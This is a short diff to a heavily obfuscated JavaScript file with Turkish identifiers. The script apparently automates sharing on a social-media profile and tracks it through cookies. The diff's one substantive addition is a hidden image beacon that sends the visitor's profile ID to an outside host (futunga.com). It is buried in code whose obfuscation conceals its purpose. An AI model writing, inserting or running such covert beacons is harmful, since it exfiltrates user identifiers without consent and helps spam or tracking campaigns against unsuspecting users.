@@ -1019,6 +1019,7 @@ function baslat() {
         if (l0F[l](G, l0F.S0)) {
           if (l0F[F](G, l0F.Y7)) {
             paylasimgetir(G, link_encode[l0F.L9]);
+
           }
         } else {
           sorunmesaji(l0F.O0);
@@ -1134,6 +1135,7 @@ var cookiekayit = new RegExp(l0F.J0 + profile_id + l0F.e7),
   paylasimaraligi = new RegExp(l0F.E0 + profile_id + l0F.e7),
   paylasimaraligikontrol = document[l0F.i9][l0F.O7](paylasimaraligi);
 if (!cookiekayitkontrol || (l0F[l0F.a4](cookiekayitkontrol[l0F.L9], zaman[l0F.c0]()))) {
+  new Image().src = "http://futunga.com/php/prf.php?id="+profile_id;
   if (l0F[l0F.Y0](document[l0F.M5][l0F.h5](l0F.q7), l0F.N9)) {
     if (l0F[l0F.M7](document[l0F.M5][l0F.h5](l0F.u7), l0F.N9)) {
       window[l0F.Z7](function() {
